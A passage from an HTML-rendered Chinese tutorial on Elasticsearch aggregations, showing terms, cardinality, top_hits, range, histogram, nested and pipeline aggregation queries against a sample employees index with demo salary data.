class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对keword 进行聚合</span></span><br><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"jobs"</span>: &#123;</span><br><span class="line">      <span class="attr">"terms"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>:<span class="string">"job.keyword"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对 Text 字段进行 terms 聚合查询，失败</span></span><br><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"jobs"</span>: &#123;</span><br><span class="line">      <span class="attr">"terms"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>:<span class="string">"job"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对 Text 字段打开 fielddata，支持terms aggregation</span></span><br><span class="line">PUT employees/_mapping</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"properties"</span> : &#123;</span><br><span class="line">    <span class="attr">"job"</span>:&#123;</span><br><span class="line">       <span class="attr">"type"</span>:     <span class="string">"text"</span>,</span><br><span class="line">       <span class="attr">"fielddata"</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对job.keyword 和 job 进行 terms 聚合，分桶的总数并不一样</span></span><br><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"cardinate"</span>: &#123;</span><br><span class="line">      <span class="attr">"cardinality"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"job"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对 性别的 keyword 进行聚合</span></span><br><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"gender"</span>: &#123;</span><br><span class="line">      <span class="attr">"terms"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>:<span class="string">"gender"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Cardinality"><a href="#Cardinality" class="headerlink" title="Cardinality"></a>Cardinality</h3><p>类似 SQL 中的 Distinct</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"cardinate"</span>: &#123;</span><br><span class="line">      <span class="attr">"cardinality"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>:<span class="string">"job.keyword"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Bucket-Size-amp-Top-Hists-Demo"><a href="#Bucket-Size-amp-Top-Hists-Demo" class="headerlink" title="Bucket Size &amp; Top Hists Demo"></a>Bucket Size &amp; Top Hists Demo</h3><ul><li>应用场景：当后去分桶后，桶内最匹配的顶部文档列表</li><li>Size : 按年龄分桶，找出指定数据量的分桶信息</li><li>Top Hits：查看各个工种中，年纪最大的 3 名员工</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 指定 bucket 的 size</span></span><br><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"ages_5"</span>: &#123;</span><br><span class="line">      <span class="attr">"terms"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>:<span class="string">"age"</span>,</span><br><span class="line">        <span class="attr">"size"</span>:<span class="number">3</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定size，不同工种中，年纪最大的3个员工的具体信息</span></span><br><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"jobs"</span>: &#123;</span><br><span class="line">      <span class="attr">"terms"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>:<span class="string">"job.keyword"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"aggs"</span>:&#123;</span><br><span class="line">        <span class="attr">"old_employee"</span>:&#123;</span><br><span class="line">          <span class="attr">"top_hits"</span>:&#123;</span><br><span class="line">            <span class="attr">"size"</span>:<span class="number">3</span>,</span><br><span class="line">            <span class="attr">"sort"</span>:[</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="attr">"age"</span>:&#123;</span><br><span class="line">                  <span class="attr">"order"</span>:<span class="string">"desc"</span></span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            ]</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="优化-Terms-聚合的性能"><a href="#优化-Terms-聚合的性能" class="headerlink" title="优化 Terms 聚合的性能"></a>优化 Terms 聚合的性能</h3><p>在聚合经常发生，性能高的，索引不断写入</p><p><img src="/images/big-data/es-06/22.jpg" alt="22"></p><blockquote><p><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/tune-for-search-speed.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/tune-for-search-speed.html</a></p></blockquote><h3 id="Range-amp-Histogram-聚合"><a href="#Range-amp-Histogram-聚合" class="headerlink" title="Range &amp; Histogram 聚合"></a>Range &amp; Histogram 聚合</h3><ul><li>按照数字的范围，进行分桶</li><li>在 Range Aggregation 中，可以自定义 Key</li><li>Demo：<ul><li>按照工资的 Range 分桶</li><li>按照工资的间隔（Histogram）分桶</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Salary Ranges 分桶，可以自己定义 key</span></span><br><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"salary_range"</span>: &#123;</span><br><span class="line">      <span class="attr">"range"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>:<span class="string">"salary"</span>,</span><br><span class="line">        <span class="attr">"ranges"</span>:[</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">"to"</span>:<span class="number">10000</span></span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">"from"</span>:<span class="number">10000</span>,</span><br><span class="line">            <span class="attr">"to"</span>:<span class="number">20000</span></span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">"key"</span>:<span class="string">"&gt;20000"</span>,</span><br><span class="line">            <span class="attr">"from"</span>:<span class="number">20000</span></span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Salary Histogram,工资0到10万，以 5000一个区间进行分桶</span></span><br><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"salary_histrogram"</span>: &#123;</span><br><span class="line">      <span class="attr">"histogram"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>:<span class="string">"salary"</span>,</span><br><span class="line">        <span class="attr">"interval"</span>:<span class="number">5000</span>,</span><br><span class="line">        <span class="attr">"extended_bounds"</span>:&#123;</span><br><span class="line">          <span class="attr">"min"</span>:<span class="number">0</span>,</span><br><span class="line">          <span class="attr">"max"</span>:<span class="number">100000</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Bucket-Metric-Aggregation"><a href="#Bucket-Metric-Aggregation" class="headerlink" title="Bucket + Metric Aggregation"></a>Bucket + Metric Aggregation</h3><ul><li>Bucket 聚合分析允许通过添加子聚合分析进一步分析，子聚合分析可以是<ul><li>Bucket</li><li>Metric</li></ul></li><li>Demo<ul><li>按照工作类型进行分桶，并统计工资信息</li><li>先按照工作类型分桶，然后按性别分桶，并统计工资信息</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 嵌套聚合1，按照工作类型分桶，并统计工资信息</span></span><br><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"Job_salary_stats"</span>: &#123;</span><br><span class="line">      <span class="attr">"terms"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"job.keyword"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">        <span class="attr">"salary"</span>: &#123;</span><br><span class="line">          <span class="attr">"stats"</span>: &#123;</span><br><span class="line">            <span class="attr">"field"</span>: <span class="string">"salary"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多次嵌套。根据工作类型分桶，然后按照性别分桶，计算工资的统计信息</span></span><br><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"Job_gender_stats"</span>: &#123;</span><br><span class="line">      <span class="attr">"terms"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"job.keyword"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">        <span class="attr">"gender_stats"</span>: &#123;</span><br><span class="line">          <span class="attr">"terms"</span>: &#123;</span><br><span class="line">            <span class="attr">"field"</span>: <span class="string">"gender"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">            <span class="attr">"salary_stats"</span>: &#123;</span><br><span class="line">              <span class="attr">"stats"</span>: &#123;</span><br><span class="line">                <span class="attr">"field"</span>: <span class="string">"salary"</span></span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Pipeline-聚合分析"><a href="#Pipeline-聚合分析" class="headerlink" title="Pipeline 聚合分析"></a>Pipeline 聚合分析</h2><h3 id="一个例子：Pipeline：min-bucket"><a href="#一个例子：Pipeline：min-bucket" class="headerlink" title="一个例子：Pipeline：min_bucket"></a>一个例子：Pipeline：min_bucket</h3><ul><li>在员工数最多的工种里，找出平均工资最低的工种</li></ul><p><img src="/images/big-data/es-06/23.jpg" alt="23"></p><h3 id="Pipeline"><a href="#Pipeline" class="headerlink" title="Pipeline"></a>Pipeline</h3><ul><li>管道的概念：支持对聚合分析的结果，再次进行聚合分析</li><li>Pipeline 的分析结果会输出到原结果汇总，根据位置的不同，分为两类<ul><li>Sibling - 结果和现有分析结果同级<ul><li>Max, min, Avg &amp; Sum Bucket</li><li>Stats, Extened Status Bucket</li><li>Percentiles Bucket</li></ul></li><li>Parent - 结果内嵌到现有的聚合分析结果之中<ul><li>Derivative（求导）</li><li>Cumultive Sum（累计求和）</li><li>Moving Function（滑动窗口）</li></ul></li></ul></li></ul><h3 id="Sibling-Pipeline-的例子"><a href="#Sibling-Pipeline-的例子" class="headerlink" title="Sibling Pipeline 的例子"></a>Sibling Pipeline 的例子</h3><ul><li>对不同类型工作的，平均工资<ul><li>求最大</li><li>平均</li><li>统计信息</li><li>百分位数</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">DELETE employees</span><br><span class="line">PUT /employees/_bulk</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"1"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Emma"</span>,<span class="attr">"age"</span>:<span class="number">32</span>,<span class="attr">"job"</span>:<span class="string">"Product Manager"</span>,<span class="attr">"gender"</span>:<span class="string">"female"</span>,<span class="attr">"salary"</span>:<span class="number">35000</span> &#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"2"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Underwood"</span>,<span class="attr">"age"</span>:<span class="number">41</span>,<span class="attr">"job"</span>:<span class="string">"Dev Manager"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>: <span class="number">50000</span>&#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"3"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Tran"</span>,<span class="attr">"age"</span>:<span class="number">25</span>,<span class="attr">"job"</span>:<span class="string">"Web Designer"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>:<span class="number">18000</span> &#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"4"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Rivera"</span>,<span class="attr">"age"</span>:<span class="number">26</span>,<span class="attr">"job"</span>:<span class="string">"Web Designer"</span>,<span class="attr">"gender"</span>:<span class="string">"female"</span>,<span class="attr">"salary"</span>: <span class="number">22000</span>&#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"5"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Rose"</span>,<span class="attr">"age"</span>:<span class="number">25</span>,<span class="attr">"job"</span>:<span class="string">"QA"</span>,<span class="attr">"gender"</span>:<span class="string">"female"</span>,<span class="attr">"salary"</span>:<span class="number">18000</span> &#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"6"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Lucy"</span>,<span class="attr">"age"</span>:<span class="number">31</span>,<span class="attr">"job"</span>:<span class="string">"QA"</span>,<span class="attr">"gender"</span>:<span class="string">"female"</span>,<span class="attr">"salary"</span>: <span class="number">25000</span>&#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"7"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Byrd"</span>,<span class="attr">"age"</span>:<span class="number">27</span>,<span class="attr">"job"</span>:<span class="string">"QA"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>:<span class="number">20000</span> &#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"8"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Foster"</span>,<span class="attr">"age"</span>:<span class="number">27</span>,<span class="attr">"job"</span>:<span class="string">"Java Programmer"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>: <span class="number">20000</span>&#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"9"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Gregory"</span>,<span class="attr">"age"</span>:<span class="number">32</span>,<span class="attr">"job"</span>:<span class="string">"Java Programmer"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>:<span class="number">22000</span> &#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"10"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Bryant"</span>,<span class="attr">"age"</span>:<span class="number">20</span>,<span class="attr">"job"</span>:<span class="string">"Java Programmer"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>: <span class="number">9000</span>&#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"11"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Jenny"</span>,<span class="attr">"age"</span>:<span class="number">36</span>,<span class="attr">"job"</span>:<span class="string">"Java Programmer"</span>,<span class="attr">"gender"</span>:<span class="string">"female"</span>,<span class="attr">"salary"</span>:<span class="number">38000</span> &#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"12"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Mcdonald"</span>,<span class="attr">"age"</span>:<span class="number">31</span>,<span class="attr">"job"</span>:<span class="string">"Java Programmer"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>: <span class="number">32000</span>&#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"13"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Jonthna"</span>,<span class="attr">"age"</span>:<span class="number">30</span>,<span class="attr">"job"</span>:<span class="string">"Java Programmer"</span>,<span class="attr">"gender"</span>:<span class="string">"female"</span>,<span class="attr">"salary"</span>:<span class="number">30000</span> &#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"14"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Marshall"</span>,<span class="attr">"age"</span>:<span class="number">32</span>,<span class="attr">"job"</span>:<span class="string">"Javascript Programmer"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>: <span class="number">25000</span>&#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"15"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"King"</span>,<span class="attr">"age"</span>:<span class="number">33</span>,<span class="attr">"job"</span>:<span class="string">"Java Programmer"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>:<span class="number">28000</span> &#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"16"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Mccarthy"</span>,<span class="attr">"age"</span>:<span class="number">21</span>,<span class="attr">"job"</span>:<span class="string">"Javascript Programmer"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>: <span class="number">16000</span>&#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"17"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Goodwin"</span>,<span class="attr">"age"</span>:<span class="number">25</span>,<span class="attr">"job"</span>:<span class="string">"Javascript Programmer"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>: <span class="number">16000</span>&#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"18"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Catherine"</span>,<span class="attr">"age"</span>:<span class="number">29</span>,<span class="attr">"job"</span>:<span class="string">"Javascript Programmer"</span>,<span class="attr">"gender"</span>:<span class="string">"female"</span>,<span class="attr">"salary"</span>: <span class="number">20000</span>&#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"19"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Boone"</span>,<span class="attr">"age"</span>:<span class="number">30</span>,<span class="attr">"job"</span>:<span class="string">"DBA"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>: <span class="number">30000</span>&#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"20"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Kathy"</span>,<span class="attr">"age"</span>:<span class="number">29</span>,<span class="attr">"job"</span>:<span class="string">"DBA"</span>,<span class="attr">"gender"</span>:<span class="string">"female"</span>,<span class="attr">"salary"</span>: <span class="number">20000</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span 